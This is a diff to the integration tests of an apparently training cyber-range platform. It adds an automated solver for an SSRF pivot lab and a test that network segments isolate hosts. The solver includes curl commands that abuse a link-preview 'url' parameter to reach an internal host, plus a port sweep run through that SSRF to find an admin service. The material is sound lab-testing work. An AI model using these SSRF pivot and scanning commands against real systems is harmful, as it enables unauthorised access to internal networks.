@@ -859,6 +859,27 @@ def test_intermediate_and_advanced_labs_end_to_end(client):
             "carved-flag": re.search(FLAG, carved).group(),
         }
 
+    def pivot(run):
+        run(
+            "for i in $(seq 1 60); do (exec 3<>/dev/tcp/jump/80) 2>/dev/null && break; "
+            "sleep 0.5; done"
+        )
+        assert "unreachable" in run("curl -s -m 3 http://vault/ || echo unreachable")
+        home = run('curl -s "http://jump/preview?url=http://vault/"')
+        found = run(
+            'for p in $(seq 8000 8099); do echo -n "$p "; '
+            'curl -s "http://jump/preview?url=http://vault:$p/" | head -1; done '
+            "| grep -v 'could not'"
+        )
+        port = found.split()[0]
+        admin = run(f'curl -s "http://jump/preview?url=http://vault:{port}/"')
+        return {
+            "internal-flag": re.search(FLAG, home).group(),
+            "admin-port": port,
+            "admin-flag": re.search(FLAG, admin).group(),
+        }
+
+    _solve(client, "pivot-ssrf", pivot)
     _solve(client, "web-logins", logins)
     _solve(client, "recon-chain", chain)
     _solve(client, "file-forensics", forensics)
@@ -1008,3 +1029,81 @@ spec:
         assert "disk.qcow2" in files and "boot.iso" in files, files
     finally:
         destroy_all(client, ws, [env])
+
+
+SEGMENTED = """apiVersion: cyberlab.dev/v1alpha1
+kind: Universe
+metadata: {name: it-pivot}
+spec:
+  environments:
+    - name: attacker
+      baseImage: ubuntu-24-04
+      resources: {cpu: 0.5, memoryMiB: 512, storageGiB: 2}
+      network: {mode: lab, segments: [dmz]}
+    - name: jump
+      role: target
+      baseImage: lab-target
+      resources: {cpu: 0.25, memoryMiB: 128, storageGiB: 1}
+      network: {mode: lab, segments: [dmz, internal]}
+      access: {terminal: false}
+    - name: vault
+      role: target
+      baseImage: lab-target
+      resources: {cpu: 0.25, memoryMiB: 128, storageGiB: 1}
+      network: {mode: lab, segments: [internal]}
+      access: {terminal: false}
+"""
+
+
+def test_network_segments_isolate_and_a_pivot_bridges_them(client):
+    """The attacker can't reach vault (other segment, not even its name), but can through
+    jump's link preview, which sits on both segments."""
+    import json as _json
+
+    ws, envs = provision(client, SEGMENTED, "it-pivot")
+    by = {e["name"]: e["resources"]["container"] for e in envs}
+    try:
+        fetchers = {"/preview": {"param": "url", "allow": ["vault"]}}
+        jump = {
+            "services": [
+                {
+                    "port": 80,
+                    "kind": "http",
+                    "routes": {"/": {"body": "jump"}},
+                    "fetchers": fetchers,
+                }
+            ]
+        }
+        vault = {
+            "services": [{"port": 80, "kind": "http", "routes": {"/": {"body": "vault-secret"}}}]
+        }
+        for name, conf in (("jump", jump), ("vault", vault)):
+            code, out = sh(
+                by[name], f"echo '{_json.dumps(conf)}' > /workspace/.cyberlab-target.json"
+            )
+            assert code == 0, out
+        get = (
+            "exec 3<>/dev/tcp/{host}/80 && printf 'GET {path} HTTP/1.0\\r\\n\\r\\n' >&3 "
+            "&& timeout 5 cat <&3"
+        )
+        wait = (
+            "for i in $(seq 1 40); do (exec 3<>/dev/tcp/jump/80) 2>/dev/null && break; "
+            "sleep 0.5; done"
+        )
+        sh(by["attacker"], wait, interpreter="bash")
+        code, direct = sh(by["attacker"], get.format(host="vault", path="/"), interpreter="bash")
+        assert code != 0 and "vault-secret" not in direct, direct
+        for _ in range(20):
+            code, via = sh(
+                by["attacker"],
+                get.format(host="jump", path="/preview?url=http://vault/"),
+                interpreter="bash",
+            )
+            if "vault-secret" in via:
+                break
+            time.sleep(0.5)
+        assert "vault-secret" in via, via
+    finally:
+        destroy_all(client, ws, envs)
+    left = docker("network", "ls", "--format", "{{.Name}}").stdout
+    assert "-lab-dmz" not in left and "-lab-internal" not in left, left
